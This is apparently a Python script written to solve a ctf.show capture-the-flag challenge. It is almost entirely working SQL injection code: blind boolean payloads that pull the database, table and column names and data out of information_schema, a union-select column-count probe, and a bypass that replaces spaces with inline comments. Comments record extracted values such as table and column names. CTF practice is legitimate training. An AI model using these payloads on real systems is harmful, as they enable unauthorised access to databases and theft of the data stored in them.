import os
import time

from aiohttp import request
from requests_html import AsyncHTMLSession, HTMLSession

url = 'http://28d8b510-702c-4264-9739-783202632252.challenge.ctf.show:8080/'
flag_success = '欢迎'
failed_text = 'error'

payload1_database_length = 'a\' or length(database())={}#'
payload_database = 'a\' or ord(substr(database(),{},1))>{}#'
payload_table = 'a\' or ord( SUBSTR((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1))>{}#'
payload_column = 'a\' or ord( SUBSTR((select group_concat(column_name) from information_schema.columns where table_name="{}"),{},1))>{}#'
payload_data = 'a\' or ord( SUBSTR((select group_concat({}) from {}),{},1))>{}#'

key = "username"
fuzz = {
    ' ': '/**/'
}

start_time = time.time()

session = HTMLSession()
proxies = {}


def get_cnum(payload):
    # if os.path.exists('sql_column_num'):
    #     return
    res = session.post(url, data={key: payload.format('0')})

    i = 0
    while '5555' not in res.text:
        i += 1
        l = range(1, i + 1)
        txt = [f'5555{j}' for j in l]
        res = session.post(url, data={
            key: payload.format(','.join(txt)),
            'password': '123'
        })
    open('sql_column_num', 'w').write(str(i))


def go(title, payload):
    if fz := globals()['fuzz']:
        for k, v in fz.items():
            payload = payload.replace(k, v)
    if title == 'column_num':
        return get_cnum(payload)

    res = session.post(url, data={key: payload})
    print(title, ' = ', res.text)


if __name__ == '__main__':
    table_name = 'flag'
    column_name = 'flag'

    go('column_num', "1' union select {}#")

    # go('database', payload_database)  # 'kanwolongxia'
    # go('table', payload_table)  # 'loflag'
    # go('column', payload_column.format(table_name, '{}', '{}'))  # Id,flaglo
    # go('data', payload_data.format(column_name, table_name, '{}', '{}'))
    print("--- %s seconds ---" % (time.time() - start_time))
